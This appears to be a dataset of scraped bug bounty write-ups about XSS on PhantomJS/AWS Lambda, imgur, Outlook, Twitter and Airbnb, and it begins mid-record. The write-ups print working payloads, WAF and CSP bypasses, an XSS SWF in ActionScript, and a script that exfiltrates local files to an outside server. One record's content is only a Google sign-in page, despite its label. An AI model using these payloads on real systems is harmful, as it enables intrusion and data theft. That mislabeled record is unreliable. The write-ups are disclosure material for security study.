src=x onerror=> would not trigger consistently. I think I got one successful window.location redirect out of 100 attempts. In some cases, the payloads would not execute at all. On top of that, I was running into some server exceptions when trying to redirect to another page: https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"window.location='https://xss.buer.haus/'\" />&text=&width=500&height=500 Response: {\"message\": \"Internal server error\"}. I tried probably 50 different types of payloads there until I realized that the problem is actually with what appeared to be some sort of race condition with PhantomJS. I ran into a similar issue writing a plugin for Phantom with my scanner where it would not wait for JavaScript to completely load when trying to capture some screenshots. I needed to find a way to make Phantom wait for my JavaScript to load before trying to finish rendering the screenshot. After trying a few different ideas, I used document.write to completely overwrite the page contents and that seemed to fix it. I don't know why, but it worked. https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"document.write('test')\" />&text=&width=500&height=500 Response: At this point I had consistent JavaScript execution on every page load. The next step I needed to take was to gather more information about PhantomJS and the context of what and where we are executing. https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"document.write(window.location)\" />&text=&width=500&height=500 Response: Interesting enough, we are executing from the origin of file:// and it was an HTML file in /var/task/. Now I wanted to see if I could <iframe> the file just to validate that I'm in the same origin as /var/task/. https://website/download?background=file.jpg&author=Brett&header=<img src=\"xasdasdasd\" onerror=\"document.write('<iframe src=file:///var/task/[redacted].html></iframe>')\"/>&text=&width=500&height=500 Now I know I can at least load files in /var/task/, so the next thing I want to do is see if I can load other files such as in /etc/. &header=<img src=\"xasdasdasd\" onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/> No response. 🙁 I searched for more information on /var/tasks and found out that it was related to AWS Lambda. This pointed me to a few files in the same folder that should contain source code for the Phantom plugin such as /var/task/index.js. I decided the contents of the files I have access to in /var/ may give me more information or at least contain something worth reporting. Using XHR and making Ajax requests I should be able to load the contents of the files and display them in the image or exfil it out to my server. I ran into additional issues putting this JavaScript directly in document.write and eventually found out that I could load an external script and it would circumvent these issues. Payload: &header=<img src=\"xasdasdasd\" onerror=\"document.write('<script src=\"https://xss.buer.haus/test.js\"></script>')\"/> test.js function reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('<iframe src=\"https://xss.buer.haus/exfil?data='+b64+'\"></iframe>'); } var oReq = new XMLHttpRequest(); oReq.addEventListener(\"load\", reqListener); oReq.open(\"GET\", \"file:///var/task/[redacted].html\"); oReq.send(); It's hard to show the results of this without exposing sensitive data, so here's just an idea of what you might see in your access logs. Now I was getting arbitrary file read using out-of-band JavaScript and XHR within the context of file://. I pointed the script to /etc/passwd again just to see if this might work where iframes did not. Boom! XHR had complete access to the file:// context when PhantomJS loading a file in <iframe src=\"file://\"> for some reason did not. In hindsight, the XSS payload seems really trivial but it took a lot of effort and guessing to get there. This is one of those weird bounties where you feel like you are trying to get a flag in a CTF challenge instead of trying to exploit a production server. My biggest takeaway from this was all of those weekends spent trying to beat obscure CTF challenges may have actually been useful after all."}
{"source_url": "https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08", "title": "Xss using dynamically generated js file | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXss using dynamically generated js file | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Xss using dynamically generated js file Arbaz Hussain 2 min read · Jul 19, 2017 -- Listen Share Severity : High Complexity: Medium Weakness: Disclosing JS endpoint & not sanitizing User Input — — — — — — — — — — — — — — — — — — — — — — — — — — — — Discovery : While checking Burp Proxy Request’s I came across following JavaScript file. https://www.site.com/mvcs/kt/tags/pclntny.js I started brute-forcing for any parameter for JS endpoint and found ?cb= Which Take’s the user input and append it to getScript Calling Function Since the Content type is text/plain. So we Need to Find a Way to Render our Input . https://www.site.com/mvcs/kt/tags/pclntny.js?cb=xxxxxxxxx Press enter or click to view image in full size We know that JS file’s doesn’t care about SOP & can be access by making cross domain request’s , Luckily there was no X-Content-Sniffing Header aswell . Now the Task was to Find Where , https://www.site.com/mvcs/kt/tags/pclntny.js js file is being rendered in HTML/Javascript under https://www.site.com/ I Used Burp Proxy Search Filter option to look for that endpoint . Press enter or click to view image in full size Found that it is used in https://www.site.com/ user/public/apps/tags?val=pcltny.js <script type=\"text/javascript\" src=\" /mvcs/kt/tags/pclntny.js \" />. . . . . var Doc = uri.queryKey[' cb ']; — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — - Exploitation : Simple POC : <html> <body> <script src=\"https://www.site.com/mvcs/kt/tags/pclntny.js?cb=xxxx')<PAYLOAD-HERE>;\"> ... window.open( https://www.site.com/ user/public/apps/tags?val=pcltny.js , '_blank').focus(); </script> </body> </html> — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — - Able to Bypass their Cross domain Policy by injecting AJAX Request’s Tools: https://github.com/maK-/parameth For checking Parameter’s . Reference : https://www.hurricanelabs.com/blog/new-xssi-vector-untold-merits-of-nosniff https://www.scip.ch/en/?labs.20160414 http://google-gruyere.appspot.com/part3#3__cross_site_script_inclusion Nice and Little Bounty! JavaScript Xss Attack -- -- Written by Arbaz Hussain 2K followers · 411 following Security Analyst No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975", "title": "How i was able to bypass strong xss protection in well known website. (imgur.com) | by Armaan Pathan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow i was able to bypass strong xss protection in well known website. (imgur.com) | by Armaan Pathan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication How i was able to bypass strong xss protection in well known website. (imgur.com) Armaan Pathan 2 min read · Jul 21, 2017 -- 5 Listen Share after finishing my final exams i have decided to give a dedicated time to bug bounty, not to EARN but to LEARN, so i had selected my target. so i selected my domain which was imgur.com. as soon as i selected the target i started browsing the website & at there i found that there is a option ALBUM DESCRIPTION Press enter or click to view image in full size i decide to find that album description is vulnerable to Cross site scripting vulnerability or not. so first i entered “/><script>alert(1);</script> and i noticed that it had removed the <script> tags from the album description at it was displaying alert(1); without any pop-up. Then I decided to use event handler payload to check that i am getting the pop-up or not. so i tried “/><svg/onload=prompt(1);> & and now i had noticed that it has removed the onload tag from album description and it was only displaying <svg/prompt(1);> tag. So here i had noticed the behavior of the application that it is stripping out the <script> tags and also stripping out the event handlers. Then after I finally decided to use both <script> tag and event handlers to bypass the xss protection so i used ”/><svg/on<script>load=prompt(document.domain);>”/><svg/on<script>load=prompt(document.cookie);> AND Press enter or click to view image in full size Press enter or click to view image in full size i had bypassed the XSS protection over there and was able to store the malicious scripts. and after reported it was patched & rewarded with sweet bounty :) JavaScript Cross Site Scripting Xss Attack Hackerone -- -- 5 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Armaan Pathan 1.6K followers · 4 following Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://wesecureapp.com/blog/xss-by-tossing-cookies/", "title": "XSS by Tossing Cookies - WeSecureApp :: Simplifying Enterprise Security", "friendly_explanation": "This is a bug bounty writeup from https://wesecureapp.com/blog/xss-by-tossing-cookies/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS by Tossing Cookies - WeSecureApp :: Simplifying Enterprise Security Home Services Application Security Web Application VAPT Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review Network Security Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing Cloud Security Cloud Auditing Cloud Pentesting Breach & Attack Simulation Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assumed Breach Staffing Services Smart Shore Sourcing Virtual CISO Solutions Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevsecOps Strategic Security Solutions Compliance RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI Guidelines for cyber security in the NBFC Sector SAR Audit ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment Resources Blog Case studies White Papers Datasheets Events Podcast Company About us Partners Careers Contact Services Application Security SERVICES Web Application Penetration Testing Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review RESOURCES Top 7 cyber security measures that enterprises shouldn’t neglect Network Security SERVICES Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing RESOURCES Top 7 Penetration Testing Companies in the USA Cloud Security SERVICES Cloud Auditing Cloud Pentesting RESOURCES Cloud Security Threats Breach & Attack Simulation SERVICES Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assessment Assumed Breach RESOURCES 7+ Major Reasons to Hire a Red Team to Harden Your App Sec Staffing Services SERVICES Smart Shore Sourcing Virtual CISO RESOURCES How to Choose a Penetration Testing Vendor Wisely? Solutions MANAGED SECURITY Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevSecOps Strategic Security Solutions RESOURCE World’s Worst Passwords: Is it time to change yours? Compliance REGULATORY COMPLIANCE RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI Guidelines for cyber security in the NBFC Sector SAR Audit for Data Localization STANDARD COMPLIANCE ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment RESOURCE HIPAA: A US Federal law to protect health information Resources Blog Datasheets Case Studies Whitepapers Podcasts Events Company About us Partners Careers Contact Home Services Application Security Web Application VAPT Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review Network Security Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing Cloud Security Cloud Auditing Cloud Pentesting Breach & Attack Simulation Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assumed Breach Staffing Services Smart Shore Sourcing Virtual CISO Solutions Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevsecOps Strategic Security Solutions Compliance RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI Guidelines for cyber security in the NBFC Sector SAR Audit ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment Resources Blog Case studies White Papers Datasheets Events Podcast Company About us Partners Careers Contact Hamburger Toggle Menu Schedule a Meeting Data Privacy · Enterprise Security · Write-up XSS by Tossing Cookies By user All cross site scripting vulnerabilities cannot be exploited easily and would need a vulnerablity chain to exploit them For example a self XSS that only executes in your profile, here is how whitton used minor OAuth flaws to exploit a cross site scripting in Uber https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ How about a XSS that needs a lot of user interaction? This is how Sasi used a clicking vulnerability to succesfully exploit a xss in Google http://sasi2103.blogspot.in/2016/09/combination-of-techniques-lead-to-dom.html What about a Cross site scripting that needs an arbitrary cookie? Here is how we found cross site scripting vulnerabilities in Outlook and Twitter by tossing cookies in Safari browser. Outlook Client Side Stored Cross Site Scripting Vulnerability There was a simple cross site scripting on outlook.live.com, a value from cookie was directly reflected back in the source without any filtering. Request GET / HTTP/1.1 Host: outlook.live.com User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Cookie: ClientId=vulnerable<>\"'; Connection: close Upgrade-Insecure-Requests: 1 Response snippet window.dateZero = new Date(0); var scriptStart = ((new Date()) - window.dateZero); window.clientId = 'vulnerable<>\"''; Setting the ClientId to payload ‘-alert(2)-‘ will give us a pop up but the challenge was on how to exploit the xss on other users. It’s possible if: There is CRLF injection(chances are like 1/100) There is another XSS(needs time) Ability to set an Arbitrary cookie We ruled out option one & two and started looking for 3. Luckily in next 5 minutes we found an endpoint were the application takes an user input & throws it directly into Set-cookie response headers. Now comes the fun part, %0a %0d were stripped out but , (comma) and ; were not. Ok! https://www.ietf.org/rfc/rfc2109.txt Here is how each browser reacts to a comma Chrome Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; Firefox Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; Safari Set-Cookie: param1=value1;,param2=value2; Cookie: param1=value1; param2=value2; Safari accepts comma delimited cookies and now we can exploit the xss on other users. Our final payload: https://outlook.live.com/owa/?realm=hotmail.com%3b%2cClientId%3d’-alert(2)- ‘ We could also set the expiry of the cookie possibly allowing us to store our payload in the victim’s browser forever. Oh wait we could also do cookie bombing like mentioned here: http://blog.innerht.ml/page/7/ Twitter XSS by tossing cookies Refer(to understand on how to store flash messages and pass them to controller using cookies in ROR): http://api.rubyonrails.org/classes/ActionDispatch/Flash.html While doing some reconnaissance we came across an end point were one could detach an email from his account: https://twitter.com/account/not_my_account/ Request POST /account/detach_email HTTP/1.1 Host: twitter.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Origin: https://twitter.com/ Content-Length: 36 Connection: keep-alive User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4 Cookie: <redacted> authenticity_token=&user=sds\"><img src=x onerror=prompt(1)>&secret= Setting the user parameter to payload will return a 302 redirect to a controller with a flash message in cookie. Response HTTP/1.1 200 OK cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0 connection: close content-security-policy: content-type: text/html;charset=utf-8 date: Mon, 10 Oct 2016 13:37:02 GMT expires: Tue, 31 Mar 1981 05:00:00 GMT last-modified: Mon, 10 Oct 2016 13:37:02 GMT pragma: no-cache server: tsa_a set-cookie: fm=0; Expires=Mon, 10 Oct 2016 13:36:52 UTC; Path=/; Domain=.twitter.com; Secure; HTTPOnly set-cookie: _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCK%252BXz65XAToMY3NyZl9p%250AZCIlZDE3ZTQxZDQ1M2I2YWViMjI2NzQ4MWExM2FjYmY1ZmU6B2lkIiU2MTM0%250AMmRmYmQxOWQ4ODFiN2JjNDMyNmQyMGI4ZjNlOQ%253D%253D--2071c49064d36eabc5121fc586c3502526a7dafd; Path=/; Domain=.twitter.com; Secure; HTTPOnly set-cookie: lang=en; Path=/ _twitter_sess cookie has a flash message stored and will be shown in the next page after redirect. The flash message was something like this “the email address is no longer associated with payload”. This is a same story like outlook, to exploit the xss we needed to set an arbitrary cookie or a csrf. Like always we are lucky again and found an end point were a user input is directly thrown in between the set cookie response headers. Our final payload was: https://twitter.com/i/safety/report_story?next_view=report_story_start&source=reporttweet&reported_user_id=108900981&reporter_user_id=602037637&is_media=true&is_promoted=false&reported_tweet_id=723164469380018178&tweet%5B%5D=%22test%22%3b,%20_twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%25250ASGFzaHsGOgtub3RpY2VDOhdUcmFuc2xhdGFibGVTdHJpbmciblRoZSBlbWFp%25250AbCBhZGRyZXNzIGlzIG5vIGxvbmdlciBhc3NvY2lhdGVkIHdpdGggdGhlIFR3%25250AaXR0ZXIgYWNjb3VudCAodGVzdCI%25252BPGltZyBzcmM9eCBvbmVycm9yPXByb21w%25250AdCgxKT4pLgY6CkB1c2VkewY7BlQ6D2NyZWF0ZWRfYXRsKwgRECMBVAE6DGNz%25250AcmZfaWQiJTEwOWQ5ZGYxNmIzZGYyNjc1ZjgzNDY3MjA0YjlkZTI3OgdpZCIl%25250AN2M3YTdiMzJkNzBkNGM2ZjZkNTgxMmMyN2Q2M2VhZTg%25253D--b26e09e3bcf3861b841b00b2279c806126009cd0%3b%20Path=/%3b%20Domain=.twitter.com%3b,s=%22akhil Video POC: Overall it was real fun for us. We have reported both the bugs to respective companies, got a bounty from Microsoft and a silent fix from twitter. Update: Twitter does have CSP 2.0 in place and Safari 9.1.3 doesn’t support 2.0 hence the pop up! Cross site scripting Related Articles Application Security · Cyber Security · Write-up Execution of Arbitrary JavaScript in Android Application Leave A Reply Cancel reply Your email address will not be published. Required fields are marked * Comment Name * Email * Website Save my name, email, and website in this browser for the next time I comment. Fabric.io API Permission Apocalypse - Privilege Escalations Previous Article Persistent XSS to Steal Passwords - Paypal Next Article Industries BFSI Healthcare Government Retail & eCommerce Information Technology Telecommunications SERVICES Application Security Network Security Cloud Security Staffing Services Threat Simulation CERT-In Audit Services SOLUTIONS Managed Security Threat Intelligence as a Service Vulnerability Management as a Service Vulnerability Remediation as a Service Strategic Security Solutions resources Blog Datasheets Case studies Podcasts Events company About Partners Careers CERT-In New White papers Contact Privacy Policy WE ARE CERTIFIED TRUST WE GAINED © 2024 WeSecureApp. All rights reserved. logo--facebook logo--instagram logo--linkedin logo--twitter Cloud Security VAPT By failing to prepare, you are preparing to fail Get Started! By failing to prepare, you are preparing to fail By failing to prepare, you are preparing to fail Blog Write For Us Subscribe to Our Podcasts Get Started! Take a peek into sample report Get Started! Get Started! Take a peek into sample report By failing to prepare, you are preparing to fail Get Started! Take a peek into sample report By failing to prepare, you are preparing to fail By failing to prepare, you are preparing to fail Take a peek into sample report Get Started! Get Started! Download Now Take a peek into sample report Download Your Comprehensive Guide to Threat Modeling Today! Staffing Services Threat Simulation BOT Force Fixed Force Flex Force Get CERT-In Audit Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Full Name Phone Email Send We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it. Ok"}
{"source_url": "https://sites.google.com/site/bugbountybughunter/home/stored-xss-in-google-image-search", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/site/bugbountybughunter/home/stored-xss-in-google-image-search. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/", "title": "Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAirbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities | ziot Menu Skip to content BLOG RESUME TWITTER < Back Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities March 8, 2017 February 25, 2024 Authors: Ben Sadeghipour Brett Buerhaus We recently started participating in Airbnb's bounty program on HackerOne . We heard a lot about this company in the past but had never used their service before. Overall they have a pretty solid website, but we were still able to discover a handful of issues. There is one vulnerability that we wanted to write about because of the level of protection in front of it. The goal of this write-up is to show others that sometimes it takes a little bit of creativity to discover potential flaws and fully exploit them. The vulnerability we discovered is a series of Cross-Site Scripting attacks that involved bypassing JSON encoding, an XSS filter, a pretty decent WAF, CSP rules, and eventually getting it to bypass Chrome's XSS auditor. Alright, diving in from the initial discovery: 1) Using a semi-colon to bypass the initial XSS filter stripping. This may not seem special, but it was an important discovery. Using a semi-colon in user input that is placed inside of <script></script> with JSON encoding would bypass a critical part of the XSS filter. As long as you placed a ; before your payload, it would prevent the XSS-filter from stripping your initial injection. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=<u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"test123\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<u>test123\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> As you can see, the <u> gets stripped from the source without a semi-colon. At this point we know that we can use an unencoded </script> to get outside of the <script></script> tag. It's not demonstrated yet, but the user-input is JSON encoded so we can't use quotes to get script execution due to it being escaped. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><u>test123 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"</script><u>test123\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> 2) Using null-bytes to bypass part of the WAF protection and it still working due to application stripping them out. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><script>alert(1)</script>; Result: After a little bit of messing around with this, we came to the conclusion that there's a Web Application Firewall (WAF) protecting the endpoint from common web attacks. I'm not going to dive too deeply into the amount of things tested, but understand that when you are put up against a WAF that it's all trial and error. You put in a few possible payloads and go a few characters at a time until you understand what is causing the WAF to kill the request. Eventually we came to this: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript>alert/**/(1)</script>\":null,\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> There's a few things to note from this: You can use a null-byte to bypass the WAF. This is demonstrated in splitting the word script into sc%00ript. Downside? It resulted in sc\\u0000ript in the request body which is invalid. While getting to that endpoint, we discovered that no matter what we tested it was impossible to get <script> on the page. There were a few elements we could use, but iframe and script are ruled out after a bit of testing and not finding a way to trick the WAF when it came to these two strings. Even with null-bytes, it resulted in broken elements This WAF is pretty decent, but a simple attack vector was able to bypass the alert check: alert/**/(1)//. This is a good discovery going forward for testing, but it also acts as a confidence boost that the WAF can be defeated. Going beyond elements, we were curious to see what happens when we added an attribute. Of course, src=\"\" is triggering the waf and adding a null-byte on it would add the \\u0000 to it like we saw before. After a bit of messing with it, adding a random junk attribute shows that JSON encoding is messing with our payload. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript/test\":\"'asdf'>alert/**/(1)\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> If you look at the source, you can see that the equal (=) got converted into a colon (:). This is a hint that our input is being encoded, so the next step required is to break it. Without breaking the encoding, we are going to have a very very tough time getting a working payload especially when factoring in additional security layers such as CSP and browser XSS auditor. Fast-forward a bit and we landed on this URL: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"<sc\\u0000ript/test\":\"'asdf'/test2='asdf'>alert/**/(1)\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Now we have null-bytes that can be used to bypass the WAF and get stripped from the request body. You might be asking... how? why? What was the process going from one URL to the next. The answer is honestly just trial and error. You have to try as many things as possible and see what sticks. There are two things worth noting on this endpoint: The first attribute we include in our payload is a throwaway. Once it converts the first equal into a colon, our equals after will stop getting converted. This is probably cause the encoder now thinks we're part of the JSON value. Null-bytes are being sent with the request but they are getting stripped out of the JSON value once the encoder sees it. Putting this together, we can try to execute a payload and see what happens. We had already looked ahead and knew CSP rules would prevent it, but this is just to demonstrate what would happen if you tried: URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><img/test='asdf'/sr%00c=''/on%00error=prompt> So although we have an injected <img> tag with a valid onerror executing JavaScript code, the CSP rules tell the browser to not execute the inline script. 3) Bypassing Content-Security Policy (CSP) to get script execution. If you load the listing_frame endpoint and look at the request response, you'll see that airbnb has Content-Security Policy enabled. A very basic description of CSP is that it determines where you can load content from and where you can execute script from. The first step is to view what the CSP rules are to figure out if there are any weaknesses. New to CSP? Recommended reading: High-level view: http://content-security-policy.com/ Spec: https://www.w3.org/TR/CSP/ default-src 'self' https:; connect-src 'self' https: http:; font-src 'self' https:; frame-src *; img-src 'self' https: http: data:; media-src 'self' https:; object-src 'self' https:; script-src 'sha256-q590j1fW +aERb666H10h55ePy0sxRjUYCiOmJPftXDs=' 'self' https: 'unsafe-eval' 'unsafe-inline' http:; style-src 'self' https: 'unsafe-inline' http:; report-uri /tracking/csp?action=listing_frame&controller=embed&req_uuid =cff37d5d-4c12-4c8b-b288-1ce0d103a25c&version=c7fc601874a5350c79eceb33ba6d4c09a433035f; Here are some observations on the CSP rules: default-src is set to 'self' which means it's setting all CSP rules to only allow src attribute from a same-origin. In short, you should only be able to load src from a relative endpoint. frame-src is set to wildcard (*) so we can load external src links in frames (iframe, frame, frameset). Because we're injecting HTML past the body element, we cannot use frame or frameset. The WAF has made it next to impossible to use iframe. script-src has 'self' supplied after the sha256 hashed script for unsafe-inline and unsafe-eval, but https does not have 'self' supplied meaning we can load external scripts for execution. We have a few options with this ruleset but there are two that standout: We can try to find a JSONP callback that lets us use special characters and include it as a relative path (same origin) script. We find an element that lets us load an external script for execution that does not involve iframe or script 4) The Initial Payloads. JSONP Callback On the first point, we did some Google searches and found that there are a few documented API calls that have JSONP callbacks on the www Airbnb domain. These callbacks are subjected to the WAF but they allow most special characters which means we can use it. The downside of this is that we'd need to solve a problem with the WAF bypass of getting a working injected <script>. Because we already tested this for a bit, the better solution was to see about SWFs. Embeddable SWF We quickly realized that <embed> was not being blocked by the WAF and that we could use null-bytes on the src attribute. With the CSP rules and the WAF bypass, we should be able to get JavaScript execution using this method. URL: https://www.airbnb.com/embeddable/listing_frame?id=9978655&city-link-index=;</script><embed/test='asdf'/sr%00c='/'> Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"id\":\"9978655\",\"city-link-index\":\"\",\"</script><embed/test\":\"'asdf'/src='/'>\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Most XSS SWF files have GET request variables to supply a JavaScript payload. We quickly realized that the WAF was blocking all attempts at including request variables in the embed src URL. It must have some sort of detection of URLs inside of GET request vars. We had to put together a SWF file with the XSS payload built inside of it to bypass this detection. Here's the actionscript we decided to use for this attack. package { import flash.display.Sprite; import flash.external.*; import flash.system.System; public class XSSProject extends Sprite { public function XSSProject() { flash.system.Security.allowDomain(\"*\"); ExternalInterface.marshallExceptions = true; try { ExternalInterface.call(\"0);}catch(e){};alert(document.domain);//\"); } catch(e:Error) { trace(e); } } } } It's a slightly modified version of Sorough Dalili's (@irsdl) flash XSS SWF on his website: https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/ The payload: URL: 